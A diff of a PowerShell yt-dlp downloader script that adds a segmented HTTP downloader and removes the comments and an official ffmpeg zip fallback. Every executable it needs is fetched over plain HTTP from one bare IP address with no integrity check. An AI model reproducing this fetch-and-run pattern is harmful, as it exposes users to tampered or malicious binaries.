@@ -1,27 +1,13 @@
-<#
-.SYNOPSIS
-    WinFetch - Fast YT-DLP Downloader
-.DESCRIPTION
-    Zero-footprint video/audio downloader with parallel binary fetching.
-    Supports custom server hosting for faster binary delivery.
-#>
-
-# ============================================================================
-# CONFIGURATION
-# ============================================================================
 $Config = @{
     TempDir      = Join-Path $env:TEMP "winfetch"
     OutputDir    = [Environment]::GetFolderPath("MyDocuments") -replace 'Documents$','Downloads'
     
-    # Binary paths
     YtDlp        = $null  # Set in Init
     Ffmpeg       = $null
     Ffprobe      = $null
     
-    # Server URL - all binaries fetched from here
     ServerUrl    = "http://74.226.163.201:8080"
     
-    # Download sources (auto-configured from ServerUrl)
     Sources      = @{
         YtDlp    = "http://74.226.163.201:8080/yt-dlp.exe"
         Ffmpeg   = "http://74.226.163.201:8080/ffmpeg.exe"
@@ -29,16 +15,10 @@ $Config = @{
     }
 }
 
-# Sources already configured in $Config, using server only
-
-# Initialize paths
 $Config.YtDlp    = Join-Path $Config.TempDir "yt-dlp.exe"
 $Config.Ffmpeg   = Join-Path $Config.TempDir "ffmpeg.exe"
 $Config.Ffprobe  = Join-Path $Config.TempDir "ffprobe.exe"
 
-# ============================================================================
-# UI HELPERS
-# ============================================================================
 function Write-UI {
     param([string]$Msg, [ValidateSet('Info','OK','Warn','Err','Run')]$Type = 'Info')
     $c = @{ Info='Gray'; OK='Green'; Warn='Yellow'; Err='Red'; Run='Cyan' }
@@ -78,21 +58,80 @@ function Read-Choice {
     }
 }
 
-# ============================================================================
-# BINARY MANAGEMENT - Parallel Downloads
-# ============================================================================
-function Get-Binary {
-    param([string]$Url, [string]$OutFile, [string]$Name)
+function Get-BinaryFast {
+    param([string]$Url, [string]$OutFile, [string]$Name, [int]$Segments = 4)
     
     Write-UI "Downloading $Name..." Run
+    
     try {
-        $ProgressPreference = 'SilentlyContinue'
-        Invoke-WebRequest -Uri $Url -OutFile $OutFile -UseBasicParsing -TimeoutSec 300
+        # Get file size
+        $req = [System.Net.HttpWebRequest]::Create($Url)
+        $req.Method = "HEAD"
+        $req.UserAgent = "Mozilla/5.0"
+        $req.AllowAutoRedirect = $true
+        $req.Timeout = 15000
+        $resp = $req.GetResponse()
+        $size = $resp.ContentLength
+        $supportsRange = $resp.Headers["Accept-Ranges"] -eq "bytes"
+        $resp.Close()
+        
+        if (-not $supportsRange -or $size -le 1MB) {
+            $ProgressPreference = 'SilentlyContinue'
+            Invoke-WebRequest -Uri $Url -OutFile $OutFile -UseBasicParsing -TimeoutSec 300
+            return $true
+        }
+        
+        $segSize = [Math]::Ceiling($size / $Segments)
+        $tempDir = Join-Path $Config.TempDir "dl_$(Get-Random)"
+        New-Item -ItemType Directory -Path $tempDir -Force | Out-Null
+        $segFiles = @()
+        
+        for ($i = 0; $i -lt $Segments; $i++) {
+            $start = $i * $segSize
+            $end = [Math]::Min(($i + 1) * $segSize - 1, $size - 1)
+            $segFile = Join-Path $tempDir "seg_$i"
+            $segFiles += $segFile
+            
+            Write-Host "`r[>] $Name segment $($i+1)/$Segments" -NoNewline
+            
+            $dlReq = [System.Net.HttpWebRequest]::Create($Url)
+            $dlReq.Method = "GET"
+            $dlReq.UserAgent = "Mozilla/5.0"
+            $dlReq.AddRange($start, $end)
+            $dlReq.Timeout = 300000
+            $dlResp = $dlReq.GetResponse()
+            $stream = $dlResp.GetResponseStream()
+            $fs = [System.IO.File]::Create($segFile)
+            $buf = New-Object byte[] 65536
+            while (($rd = $stream.Read($buf, 0, $buf.Length)) -gt 0) {
+                $fs.Write($buf, 0, $rd)
+            }
+            $fs.Close(); $stream.Close(); $dlResp.Close()
+        }
+        Write-Host ""
+        
+        $outStream = [System.IO.File]::Create($OutFile)
+        $buf = New-Object byte[] 1048576
+        foreach ($sf in $segFiles) {
+            $inStream = [System.IO.File]::OpenRead($sf)
+            while (($rd = $inStream.Read($buf, 0, $buf.Length)) -gt 0) {
+                $outStream.Write($buf, 0, $rd)
+            }
+            $inStream.Close()
+        }
+        $outStream.Close()
+        Remove-Item $tempDir -Recurse -Force -EA SilentlyContinue
+        
         return $true
     } catch {
         Write-UI "Failed: $_" Err
         return $false
     }
+}
+
+function Get-Binary {
+    param([string]$Url, [string]$OutFile, [string]$Name)
+    return Get-BinaryFast -Url $Url -OutFile $OutFile -Name $Name -Segments 4
 }
 
 function Get-FfmpegFromZip {
@@ -109,14 +148,12 @@ function Get-FfmpegFromZip {
         Write-UI "Extracting ffmpeg..." Run
         Expand-Archive -Path $zip -DestinationPath $extract -Force
         
-        # Find and copy binaries
         $ff = Get-ChildItem -Path $extract -Recurse -Filter "ffmpeg.exe" | Select-Object -First 1
         $fp = Get-ChildItem -Path $extract -Recurse -Filter "ffprobe.exe" | Select-Object -First 1
         
         if ($ff) { Copy-Item $ff.FullName -Destination $Config.Ffmpeg -Force }
         if ($fp) { Copy-Item $fp.FullName -Destination $Config.Ffprobe -Force }
         
-        # Cleanup
         Remove-Item $zip -Force -EA SilentlyContinue
         Remove-Item $extract -Recurse -Force -EA SilentlyContinue
         
@@ -128,7 +165,6 @@ function Get-FfmpegFromZip {
 }
 
 function Initialize-Binaries {
-    # Create temp dir
     if (-not (Test-Path $Config.TempDir)) {
         New-Item -ItemType Directory -Path $Config.TempDir -Force | Out-Null
     }
@@ -143,70 +179,24 @@ function Initialize-Binaries {
     
     $ProgressPreference = 'SilentlyContinue'
     
-    # Download yt-dlp
     if ($needYtDlp) {
-        Write-UI "Downloading yt-dlp..." Run
-        try {
-            Invoke-WebRequest -Uri $Config.Sources.YtDlp -OutFile $Config.YtDlp -UseBasicParsing -TimeoutSec 120
+        if (Get-BinaryFast -Url $Config.Sources.YtDlp -OutFile $Config.YtDlp -Name "yt-dlp" -Segments 4) {
             Write-UI "yt-dlp OK" OK
-        } catch {
-            Write-UI "yt-dlp failed: $_" Err
         }
     }
     
-    # Download ffmpeg
     if ($needFfmpeg) {
-        $ffmpegUrl = $Config.Sources.Ffmpeg
-        $isDirectExe = $ffmpegUrl -match '\.exe$'
+        if (Get-BinaryFast -Url $Config.Sources.Ffmpeg -OutFile $Config.Ffmpeg -Name "ffmpeg" -Segments 4) {
+            Write-UI "ffmpeg OK" OK
+        }
         
-        if ($isDirectExe) {
-            # Direct .exe download (from custom server)
-            Write-UI "Downloading ffmpeg..." Run
-            try {
-                Invoke-WebRequest -Uri $ffmpegUrl -OutFile $Config.Ffmpeg -UseBasicParsing -TimeoutSec 120
-                Write-UI "ffmpeg OK" OK
-            } catch {
-                Write-UI "ffmpeg failed: $_" Err
-            }
-            
-            # Also download ffprobe if server provides it
-            if ($Config.Sources.Ffprobe) {
-                Write-UI "Downloading ffprobe..." Run
-                try {
-                    Invoke-WebRequest -Uri $Config.Sources.Ffprobe -OutFile $Config.Ffprobe -UseBasicParsing -TimeoutSec 120
-                    Write-UI "ffprobe OK" OK
-                } catch {
-                    Write-UI "ffprobe failed: $_" Err
-                }
-            }
-        } else {
-            # Zip download (GitHub/Gyan)
-            Write-UI "Downloading ffmpeg (zip)..." Run
-            $zip = Join-Path $Config.TempDir "ffmpeg.zip"
-            $extract = Join-Path $Config.TempDir "ffmpeg-tmp"
-            
-            try {
-                Invoke-WebRequest -Uri $ffmpegUrl -OutFile $zip -UseBasicParsing -TimeoutSec 600
-                
-                Write-UI "Extracting ffmpeg..." Run
-                Expand-Archive -Path $zip -DestinationPath $extract -Force
-                
-                $ff = Get-ChildItem -Path $extract -Recurse -Filter "ffmpeg.exe" | Select-Object -First 1
-                $fp = Get-ChildItem -Path $extract -Recurse -Filter "ffprobe.exe" | Select-Object -First 1
-                
-                if ($ff) { Copy-Item $ff.FullName -Destination $Config.Ffmpeg -Force }
-                if ($fp) { Copy-Item $fp.FullName -Destination $Config.Ffprobe -Force }
-                
-                Remove-Item $zip -Force -EA SilentlyContinue
-                Remove-Item $extract -Recurse -Force -EA SilentlyContinue
-                Write-UI "ffmpeg OK" OK
-            } catch {
-                Write-UI "ffmpeg failed: $_" Err
+        if ($Config.Sources.Ffprobe) {
+            if (Get-BinaryFast -Url $Config.Sources.Ffprobe -OutFile $Config.Ffprobe -Name "ffprobe" -Segments 4) {
+                Write-UI "ffprobe OK" OK
             }
         }
     }
     
-    # Verify
     $ok = (Test-Path $Config.YtDlp) -and (Test-Path $Config.Ffmpeg)
     if ($ok) { Write-UI "All binaries ready" OK }
     else { Write-UI "Binary init failed" Err }
